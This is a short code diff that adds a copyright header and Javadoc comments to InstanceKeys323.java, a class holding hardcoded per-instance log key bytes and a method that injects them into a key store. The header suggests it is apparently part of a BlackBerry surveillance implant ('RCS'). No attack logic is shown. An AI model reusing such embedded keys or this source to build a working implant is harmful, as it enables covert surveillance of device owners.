@@ -1,5 +1,17 @@
+/* *************************************************
+ * Copyright (c) 2010 - 2010
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSBlackBerry
+ * Package      : blackberry.config
+ * File         : InstanceKeys323.java
+ * Created      : 28-apr-2010
+ * *************************************************/
 package blackberry.config;
 
+// TODO: Auto-generated Javadoc
+/**
+ * The Class InstanceKeys323.
+ */
 public final class InstanceKeys323 {
     // RCS 323
     public static byte[] logKey = new byte[] { (byte) 0x2b, (byte) 0xb8,
@@ -15,6 +27,9 @@ public final class InstanceKeys323 {
             (byte) 0xa5, (byte) 0x51, (byte) 0x30, (byte) 0xdb, (byte) 0x9b,
             (byte) 0xac, (byte) 0x6f, (byte) 0xd5, (byte) 0xfb };
 
+    /**
+     * Inject keys323.
+     */
     public static void injectKeys323() {
 
         final Keys keys = Keys.getInstance();
